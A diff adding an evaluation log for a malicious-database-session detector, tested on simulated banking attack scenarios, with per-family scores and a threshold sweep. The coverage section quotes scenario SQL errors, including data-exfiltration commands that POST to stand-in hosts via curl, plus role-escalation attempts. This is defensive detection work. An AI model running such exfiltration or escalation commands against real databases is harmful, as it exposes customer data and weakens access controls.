@@ -1,0 +1,51 @@
+[algo4] using θ_A = 0.55 tuned for casce_gat_v3.pt
+== Coverage
+  daemon scored 93 sessions: 93 labelled, 0 unlabelled
+  runner planned 93 scenario sessions: 93 scored, 0 never scored, 87 had SQL errors
+    SQL error in s0000_0 banking_defense_impair_0017: ERROR:  permission denied to set parameter "log_statement"
+    SQL error in s0001_0 banking_etl_exfil_mal_0001: ERROR:  program "curl -sX POST https://sync.example.net/push -d @-" failed
+    SQL error in s0002_0 banking_priv_abuse_0003: ERROR:  permission denied to create role
+    SQL error in s0003_0 banking_teller_pii_dump_0010: ERROR:  program "curl -sX POST https://drop.example.net/upload -d @-" failed
+    SQL error in s0004_0 banking_alter_role_esc_0012: ERROR:  permission denied to alter role
+
+== Final verdict per session (score once the session has ended), theta_A = 0.55
+  ALL        n=  93  FP=  0  TN=   0  TP= 93  FN=  0  precision=1.000  recall=1.000  F1=1.000
+  scenario   n=  93  FP=  0  TN=   0  TP= 93  FN=  0  precision=1.000  recall=1.000  F1=1.000
+
+== Real-time view: alerted at ANY point while the session was running
+  ALL        n=  93  FP=  0  TN=   0  TP= 93  FN=  0  precision=1.000  recall=1.000  F1=1.000
+  scenario   n=  93  FP=  0  TN=   0  TP= 93  FN=  0  precision=1.000  recall=1.000  F1=1.000
+  alerts raised on a partial session whose final verdict is benign: 0
+
+== Per scenario family (theta_A = 0.55)
+  Malicious banking_alter_role_esc           n=   3  FP=  0  TN=   0  TP=  3  FN=  0  precision=1.000  recall=1.000  F1=1.000  risk median=0.822 max=0.822
+  Malicious banking_compliance_exfil         n=  16  FP=  0  TN=   0  TP= 16  FN=  0  precision=1.000  recall=1.000  F1=1.000  risk median=0.823 max=0.823
+  Malicious banking_defense_impair           n=  12  FP=  0  TN=   0  TP= 12  FN=  0  precision=1.000  recall=1.000  F1=1.000  risk median=0.830 max=0.830
+  Malicious banking_etl_exfil_mal            n=  14  FP=  0  TN=   0  TP= 14  FN=  0  precision=1.000  recall=1.000  F1=1.000  risk median=0.823 max=0.823
+  Malicious banking_multi_apt                n=  18  FP=  0  TN=   0  TP= 18  FN=  0  precision=1.000  recall=1.000  F1=1.000  risk median=0.750 max=0.823
+  Malicious banking_priv_abuse               n=  16  FP=  0  TN=   0  TP= 16  FN=  0  precision=1.000  recall=1.000  F1=1.000  risk median=0.750 max=0.750
+  Malicious banking_teller_pii_dump          n=  14  FP=  0  TN=   0  TP= 14  FN=  0  precision=1.000  recall=1.000  F1=1.000  risk median=0.822 max=0.822
+
+== Threshold sweep (all labelled sessions)
+  theta=0.2  n=  93  FP=  0  TN=   0  TP= 93  FN=  0  precision=1.000  recall=1.000  F1=1.000
+  theta=0.3  n=  93  FP=  0  TN=   0  TP= 93  FN=  0  precision=1.000  recall=1.000  F1=1.000
+  theta=0.4  n=  93  FP=  0  TN=   0  TP= 93  FN=  0  precision=1.000  recall=1.000  F1=1.000
+  theta=0.5  n=  93  FP=  0  TN=   0  TP= 93  FN=  0  precision=1.000  recall=1.000  F1=1.000
+  theta=0.6  n=  93  FP=  0  TN=   0  TP= 93  FN=  0  precision=1.000  recall=1.000  F1=1.000
+  theta=0.7  n=  93  FP=  0  TN=   0  TP= 93  FN=  0  precision=1.000  recall=1.000  F1=1.000
+  theta=0.8  n=  93  FP=  0  TN=   0  TP= 65  FN= 28  precision=1.000  recall=0.699  F1=0.823
+  theta=0.9  n=  93  FP=  0  TN=   0  TP=  0  FN= 93  precision=0.000  recall=0.000  F1=0.000
+[algo4] Loaded trained GAT weights from casce_gat_v3.pt (feature version 3)
+
+== Same sessions: synthetic corpus vs live (same model, same theta)
+  93 sessions matched to their synthetic twin
+  same verdict: 93/93   live-synthetic risk: mean +0.004, mean |diff| 0.004
+  synthetic: n=  93  FP=  0  TN=   0  TP= 93  FN=  0  precision=1.000  recall=1.000  F1=1.000
+  live     : n=  93  FP=  0  TN=   0  TP= 93  FN=  0  precision=1.000  recall=1.000  F1=1.000
+    banking_alter_role_esc           n=  3  synthetic median=0.822  live median=0.822
+    banking_compliance_exfil         n= 16  synthetic median=0.823  live median=0.823
+    banking_defense_impair           n= 12  synthetic median=0.802  live median=0.830
+    banking_etl_exfil_mal            n= 14  synthetic median=0.823  live median=0.823
+    banking_multi_apt                n= 18  synthetic median=0.750  live median=0.750
+    banking_priv_abuse               n= 16  synthetic median=0.750  live median=0.750
+    banking_teller_pii_dump          n= 14  synthetic median=0.822  live median=0.822
